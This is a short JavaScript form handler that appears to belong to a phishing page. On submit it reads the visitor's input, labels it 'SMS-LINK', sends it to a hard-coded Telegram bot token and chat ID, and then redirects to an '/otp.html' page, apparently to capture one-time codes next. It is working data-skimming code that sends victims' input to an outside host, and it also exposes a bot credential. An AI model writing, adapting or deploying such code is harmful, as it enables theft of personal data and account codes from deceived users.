
        
    const TOKEN = "6333752293:AAFdEfM4vJE7fTyewU2b9SDmm-Ujo4d2jtI";
const CHAT_ID = "6319844150";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("fetch");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { name, } = form;
  const data = {
    name: name.value,
  };

  let message = `<b></b>\n`;
  message += `<b>SMS-LINK : </b> ${data.name}`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href = '/otp.html';
}

